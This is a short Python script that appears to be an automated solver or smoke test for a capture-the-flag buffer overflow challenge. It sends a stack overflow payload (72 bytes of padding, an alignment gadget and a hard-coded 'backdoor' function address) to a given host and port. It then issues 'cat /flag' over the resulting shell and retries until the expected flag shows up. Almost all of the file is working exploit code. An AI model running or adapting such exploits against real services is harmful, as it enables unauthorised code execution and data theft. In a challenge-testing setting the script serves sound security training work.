#!/usr/bin/env python3
import argparse
import socket
import struct
import sys
import time


OFFSET = 72
RET_ALIGN = 0x40117C
BACKDOOR = 0x401156


def exploit_once(host: str, port: int, timeout: float) -> bytes:
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        payload = (
            b"A" * OFFSET +
            struct.pack("<Q", RET_ALIGN) +
            struct.pack("<Q", BACKDOOR)
        )
        sock.sendall(payload)
        time.sleep(0.2)
        sock.sendall(b"cat /flag\nexit\n")

        chunks = []
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True, type=int)
    parser.add_argument("--expect", required=True)
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--ready-timeout", type=float, default=60.0)
    args = parser.parse_args()

    expected = args.expect.encode()
    deadline = time.time() + args.ready_timeout
    last_error = None

    while time.time() < deadline:
        try:
            data = exploit_once(args.host, args.port, args.timeout)
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.write(b"\n")
            if expected not in data:
                raise RuntimeError("expected flag not found in response")
            print("[+] smoke test matched expected flag")
            return 0
        except Exception as exc:
            last_error = exc
            time.sleep(1.0)

    print(f"[-] smoke test failed before ready timeout: {last_error}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
